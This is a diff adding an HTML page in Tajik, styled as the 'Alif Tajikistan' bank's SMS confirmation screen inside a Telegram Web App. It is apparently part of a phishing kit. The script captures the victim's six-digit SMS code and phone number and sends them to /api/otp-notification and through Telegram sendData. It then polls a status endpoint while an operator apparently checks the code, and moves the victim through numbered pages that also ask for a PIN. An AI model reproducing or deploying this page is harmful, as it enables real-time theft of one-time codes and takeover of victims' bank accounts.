@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="tg">
+<head>
+     <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+     <title>Рамзи тасдиқ — Алиф Тоҷикистон</title>
+
+     <!-- ✅ Telegram SDK -->
+     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+     <style>
+          :root {
+               --alif-green: #00B956;
+               --alif-green-dark: #009E49;
+               --alif-dark: #1A1C1E;
+               --bg-color: #F4F5F7;
+               --card-bg: #FFFFFF;
+               --text-dark: #1A1C1E;
+               --text-muted: #6E7781;
+               --border-color: #E2E8F0;
+               --input-bg: #ECFDF3;
+               --calc-border: #C6F6D5;
+          }
+
+          * {
+               box-sizing: border-box;
+               font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+               -webkit-tap-highlight-color: transparent;
+          }
+
+          body {
+               background-color: var(--bg-color);
+               margin: 0;
+               padding: 0;
+               display: flex;
+               flex-direction: column;
+               min-height: 100vh;
+               color: var(--text-dark);
+          }
+
+          /* Сарлавҳаи болоӣ */
+          .app-header {
+               width: 100%;
+               background-color: transparent;
+               height: 60px;
+               padding: 0 20px;
+               display: flex;
+               align-items: center;
+               gap: 15px;
+               position: sticky;
+               top: 0;
+               z-index: 100;
+          }
+
+          .back-btn-top {
+               color: var(--text-dark);
+               text-decoration: none;
+               font-size: 22px;
+               font-weight: 700;
+               cursor: pointer;
+               display: flex;
+               align-items: center;
+          }
+
+          .header-title {
+               font-size: 20px;
+               font-weight: 800;
+               color: var(--text-dark);
+               letter-spacing: -0.3px;
+          }
+
+          /* Қуттии асосӣ */
+          .container {
+               width: 100%;
+               max-width: 440px;
+               margin: 10px auto 0;
+               padding: 0 24px 30px;
+               display: flex;
+               flex-direction: column;
+               flex-grow: 1;
+          }
+
+          .instruction-text {
+               font-size: 15px;
+               color: var(--text-muted);
+               margin: 10px 0 25px;
+               line-height: 1.45;
+               font-weight: 500;
+          }
+
+          /* 🚨 Баннери хатогӣ */
+          .error-banner {
+               width: 100%;
+               background-color: #FFEBE9;
+               border: 1px solid #FF4D4F;
+               color: #D93025;
+               padding: 12px;
+               border-radius: 12px;
+               font-size: 14px;
+               font-weight: 700;
+               margin-bottom: 20px;
+               display: none;
+               text-align: center;
+               box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
+          }
+
+          /* Гурӯҳи майдонҳои OTP */
+          .otp-input-group {
+               display: flex;
+               justify-content: space-between;
+               gap: 8px;
+               margin-bottom: 25px;
+               width: 100%;
+               cursor: pointer;
+          }
+
+          .otp-box {
+               flex: 1;
+               min-width: 0;
+               height: 52px;
+               background-color: #FFFFFF;
+               border: 1.5px solid var(--calc-border);
+               border-radius: 12px;
+               font-size: 22px;
+               font-weight: 800;
+               text-align: center;
+               outline: none;
+               color: var(--text-dark);
+               transition: border-color 0.2s, background-color 0.2s;
+          }
+
+          .otp-box:focus {
+               border-color: var(--alif-green);
+               background-color: #FFFFFF;
+          }
+
+          .otp-box.input-error {
+               border-color: #D93025;
+               background-color: #FFF9F9;
+          }
+
+          /* Қуттии таймер */
+          .timer-card {
+               background-color: var(--input-bg);
+               border: 1px solid var(--calc-border);
+               border-radius: 14px;
+               padding: 16px 20px;
+               display: flex;
+               justify-content: space-between;
+               align-items: center;
+               margin-bottom: 30px;
+               width: 100%;
+          }
+
+          .resend-wrapper {
+               display: flex;
+               align-items: center;
+               gap: 8px;
+          }
+
+          .resend-text {
+               font-size: 15px;
+               color: var(--text-dark);
+               font-weight: 700;
+          }
+
+          .timer-countdown {
+               font-size: 16px;
+               font-weight: 800;
+               color: var(--alif-green);
+          }
+
+          .resend-action-btn {
+               color: var(--alif-green);
+               font-weight: 800;
+               text-decoration: underline;
+               cursor: pointer;
+               font-size: 15px;
+               display: none;
+          }
+
+          /* Тугмаҳо */
+          .btn-confirm {
+               background-color: var(--alif-green);
+               color: #ffffff;
+               border: none;
+               width: 100%;
+               padding: 16px;
+               border-radius: 14px;
+               font-size: 16px;
+               font-weight: 800;
+               cursor: pointer;
+               transition: background-color 0.2s, transform 0.1s;
+               margin-bottom: 16px;
+               box-shadow: 0 4px 14px rgba(0, 185, 86, 0.28);
+          }
+
+          .btn-confirm:active {
+               background-color: var(--alif-green-dark);
+               transform: scale(0.99);
+          }
+
+          .btn-cancel {
+               background-color: transparent;
+               color: var(--alif-green);
+               border: none;
+               font-size: 16px;
+               font-weight: 800;
+               cursor: pointer;
+               text-align: center;
+               width: 100%;
+               text-decoration: underline;
+          }
+
+          /* 📱 Саҳифаи болопӯши ҳолат */
+          .overlay-status {
+               position: fixed;
+               top: 0;
+               left: 0;
+               width: 100vw;
+               height: 100vh;
+               background-color: var(--alif-dark);
+               z-index: 9999;
+               display: none;
+               flex-direction: column;
+               justify-content: center;
+               align-items: center;
+               text-align: center;
+               padding: 24px;
+               box-sizing: border-box;
+          }
+
+          .overlay-status.active {
+               display: flex;
+          }
+
+          .overlay-spinner-circle {
+               width: 90px;
+               height: 90px;
+               background: linear-gradient(180deg, #00C853 0%, #00B956 100%);
+               border-radius: 50%;
+               margin-bottom: 28px;
+               display: flex;
+               justify-content: center;
+               align-items: center;
+               box-shadow: 0 6px 20px rgba(0, 185, 86, 0.35);
+          }
+
+          .overlay-spinner-circle::after {
+               content: '';
+               width: 66px;
+               height: 66px;
+               border: 4px solid rgba(255, 255, 255, 0.2);
+               border-top: 4px solid var(--alif-dark);
+               border-radius: 50%;
+               animation: spin 1.2s linear infinite;
+          }
+
+          @keyframes spin {
+               0% { transform: rotate(0deg); }
+               100% { transform: rotate(360deg); }
+          }
+
+          .overlay-title {
+               color: #ffffff;
+               font-size: 24px;
+               font-weight: 800;
+               margin: 0 0 12px;
+               letter-spacing: -0.3px;
+          }
+
+          .overlay-subtext {
+               color: #94A3B8;
+               font-size: 15px;
+               margin: 0;
+               line-height: 1.5;
+               font-weight: 500;
+               max-width: 300px;
+          }
+     </style>
+</head>
+
+<body>
+
+<!-- Сарлавҳа -->
+<div class="app-header">
+     <a onclick="goBack()" class="back-btn-top">←</a>
+     <div class="header-title">Рамзи тасдиқ</div>
+</div>
+
+<div class="container">
+     <p class="instruction-text">
+          Рамзи 6-рақамаеро, ки тавассути паёми SMS гирифтед, ворид кунед.
+     </p>
+
+     <!-- Баннери хатогӣ -->
+     <div id="statusErrorContainer" class="error-banner"></div>
+
+     <form id="otpForm" onsubmit="submitOtp(event)">
+          <!-- Майдонҳои PIN -->
+          <div class="otp-input-group" id="otpGroup">
+               <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+               <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+               <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+               <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+               <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+               <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+          </div>
+
+          <!-- Қуттии таймер -->
+          <div class="timer-card">
+               <div class="resend-wrapper">
+                    <span class="resend-text">Ирсоли дубораи рамз</span>
+               </div>
+               <div id="timerCountdown" class="timer-countdown">01:00</div>
+               <div id="resendBtn" class="resend-action-btn" onclick="resendCode()">Ирсоли дубора</div>
+          </div>
+
+          <button type="submit" id="verifyBtn" class="btn-confirm">Тасдиқ кардан</button>
+          <button type="button" class="btn-cancel" onclick="goBack()">Бекор кардан</button>
+     </form>
+</div>
+
+<!-- Огоҳиномаи ҳолат -->
+<div id="statusOverlay" class="overlay-status">
+     <div class="overlay-spinner-circle"></div>
+     <h2 class="overlay-title" id="overlayMainText">Лутфан интизор шавед...</h2>
+     <p class="overlay-subtext" id="overlaySubText">Санҷиши рамзи SMS...</p>
+</div>
+
+<script>
+     const TOTAL_TIME = 60;
+     let timeLeft = TOTAL_TIME;
+     let timerInterval = null;
+     let statusPollingInterval = null;
+
+     const timerCountdownEl = document.getElementById('timerCountdown');
+     const resendBtnEl = document.getElementById('resendBtn');
+     const statusErrorContainer = document.getElementById('statusErrorContainer');
+     const otpBoxes = Array.from(document.querySelectorAll('.otp-box'));
+     const otpGroup = document.getElementById('otpGroup');
+
+     const statusOverlay = document.getElementById('statusOverlay');
+     const overlayMainText = document.getElementById('overlayMainText');
+     const overlaySubText = document.getElementById('overlaySubText');
+
+     window.onload = () => {
+          const tg = window.Telegram?.WebApp;
+          if (tg) {
+               tg.ready();
+               tg.expand();
+          }
+
+          setupOtpInputLogic();
+          startTimer();
+     };
+
+     function setupOtpInputLogic() {
+          otpBoxes.forEach((box, index) => {
+               box.addEventListener('input', (e) => {
+                    const val = box.value.replace(/\D/g, '');
+                    box.value = val;
+
+                    otpBoxes.forEach(b => b.classList.remove('input-error'));
+                    statusErrorContainer.style.display = 'none';
+
+                    if (val && index < otpBoxes.length - 1) {
+                         otpBoxes[index + 1].focus();
+                    }
+               });
+
+               box.addEventListener('keydown', (e) => {
+                    if (e.key === "Backspace") {
+                         if (!box.value && index > 0) {
+                              otpBoxes[index - 1].focus();
+                         }
+                    }
+               });
+
+               box.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const pastedData = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                    
+                    if (pastedData) {
+                         const digits = pastedData.split('').slice(0, 6);
+                         digits.forEach((digit, idx) => {
+                              if (otpBoxes[idx]) {
+                                   otpBoxes[idx].value = digit;
+                              }
+                         });
+                         const nextIndex = Math.min(digits.length, 5);
+                         otpBoxes[nextIndex].focus();
+                    }
+               });
+          });
+
+          otpGroup.addEventListener('click', () => {
+               const emptyBox = otpBoxes.find(b => !b.value) || otpBoxes[otpBoxes.length - 1];
+               emptyBox.focus();
+          });
+
+          setTimeout(() => {
+               if (otpBoxes[0]) otpBoxes[0].focus();
+          }, 300);
+     }
+
+     function startTimer() {
+          if (timerInterval) clearInterval(timerInterval);
+          
+          timeLeft = TOTAL_TIME;
+          updateTimerDisplay();
+
+          resendBtnEl.style.display = 'none';
+          timerCountdownEl.style.display = 'block';
+
+          timerInterval = setInterval(() => {
+               timeLeft--;
+               updateTimerDisplay();
+
+               if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    onTimerExpired();
+               }
+          }, 1000);
+     }
+
+     function updateTimerDisplay() {
+          const minutes = Math.floor(timeLeft / 60);
+          const seconds = timeLeft % 60;
+          
+          const formattedMinutes = String(minutes).padStart(2, '0');
+          const formattedSeconds = String(seconds).padStart(2, '0');
+          
+          timerCountdownEl.textContent = `${formattedMinutes}:${formattedSeconds}`;
+     }
+
+     function onTimerExpired() {
+          timerCountdownEl.style.display = 'none';
+          resendBtnEl.style.display = 'block';
+     }
+
+     async function resendCode() {
+          const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+          try {
+               await fetch("/api/resend-otp-notification", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ phone, step: "First OTP (Page 8)" })
+               });
+          } catch (err) {
+               console.error("Хатогии ирсоли дубора:", err);
+          }
+          alert("Рамзи нави тасдиқ тавассути SMS фиристода шуд.");
+          startTimer();
+     }
+
+     async function submitOtp(event) {
+          event.preventDefault();
+
+          let codeVal = "";
+          otpBoxes.forEach(b => codeVal += b.value);
+
+          if (codeVal.length < 6) {
+               statusErrorContainer.style.display = 'block';
+               statusErrorContainer.textContent = "Рамзи нодуруст, лутфан рамзи пурраи 6-рақамаро ворид кунед.";
+               otpBoxes.forEach(b => b.classList.add('input-error'));
+               return;
+          }
+
+          statusErrorContainer.style.display = 'none';
+          otpBoxes.forEach(b => b.classList.remove('input-error'));
+
+          const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+
+          overlayMainText.textContent = "Лутфан интизор шавед...";
+          overlaySubText.textContent = "Санҷиши рамзи SMS...";
+          statusOverlay.classList.add('active');
+
+          localStorage.setItem('smsOtp1', codeVal);
+
+          try {
+               await fetch("/api/otp-notification", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ event: "otp_verification_1", phone, otp: codeVal })
+               });
+          } catch (err) {
+               console.error("❌ Хатогии огоҳинома:", err);
+          }
+
+          const tg = window.Telegram?.WebApp;
+          if (tg && tg.sendData) {
+               tg.sendData(JSON.stringify({ event: "otp_verification_1", phone: phone, otp: codeVal }));
+          }
+
+          startStatusPolling(phone);
+     }
+
+     function startStatusPolling(phone) {
+          if (statusPollingInterval) clearInterval(statusPollingInterval);
+
+          statusPollingInterval = setInterval(async () => {
+               try {
+                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+                    const data = await response.json();
+
+                    if (data.status === "otp1_correct") {
+                         clearInterval(statusPollingInterval);
+                         overlayMainText.textContent = "Рамз тасдиқ шуд!";
+                         overlaySubText.textContent = "Гузариш ба саҳифаи навбатӣ...";
+
+                         setTimeout(() => {
+                              window.location.href = "/page9";
+                         }, 1200);
+                    } 
+                    else if (data.status === "otp1_wrong") {
+                         clearInterval(statusPollingInterval);
+                         statusOverlay.classList.remove('active');
+                         
+                         statusErrorContainer.style.display = 'block';
+                         statusErrorContainer.textContent = "Рамзи нодуруст. Лутфан рамзи дурустро ворид кунед.";
+                         otpBoxes.forEach(b => {
+                              b.classList.add('input-error');
+                              b.value = "";
+                         });
+                         if (otpBoxes[0]) otpBoxes[0].focus();
+                    }
+                    else if (data.status === "otp2_wrongpin") {
+                         clearInterval(statusPollingInterval);
+                         statusOverlay.classList.remove('active');
+                         
+                         window.location.href = "/page6?error=wrong_pin";
+                    }
+               } catch (err) {
+                    console.error("Хатогии санҷиши ҳолат:", err);
+               }
+          }, 2000);
+     }
+
+     function goBack() {
+          if (statusPollingInterval) clearInterval(statusPollingInterval);
+          window.location.href = "/page6";
+     }
+</script>
+
+</body>
+</html>
